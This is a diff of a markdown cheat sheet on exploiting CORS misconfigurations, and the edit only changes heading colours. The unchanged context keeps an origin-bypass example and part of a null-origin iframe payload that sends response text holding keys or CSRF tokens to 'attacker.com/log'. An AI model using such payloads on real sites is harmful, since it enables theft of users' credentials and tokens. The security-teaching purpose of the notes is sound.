@@ -2,7 +2,7 @@
 
 **Impact**: if a response contains any sensitive information such as an API key or CSRF token, you could retrieve these info.
 
-## <mark style="color:yellow;">Server ACAO Header from Client-Origin</mark>
+## <mark style="color:purple;">Server ACAO Header from Client-Origin</mark>
 
 Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.
 
@@ -26,7 +26,7 @@ function reqListener() {
 </script>
 ```
 
-## <mark style="color:yellow;">**Errors parsing Origin headers**</mark>
+## <mark style="color:purple;">**Errors parsing Origin headers**</mark>
 
 Suppose `normal-website.com`. Bypass with`hackersnormal-website.com` or `normal-website.com.evil-user.net`
 
@@ -34,7 +34,7 @@ Suppose `normal-website.com`. Bypass with`hackersnormal-website.com` or `normal-
 **Note**: you need to know the whitelisted origins.
 {% endhint %}
 
-## <mark style="color:yellow;">**Whitelisted null origin value**</mark>
+## <mark style="color:purple;">**Whitelisted null origin value**</mark>
 
 **Detection**
 
@@ -56,7 +56,7 @@ location='https://attacker.com/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-## <mark style="color:yellow;">Exploiting XSS via CORS trust relationships</mark> <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
+## <mark style="color:purple;">Exploiting XSS via CORS trust relationships</mark> <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
 
 Suppose that:
 
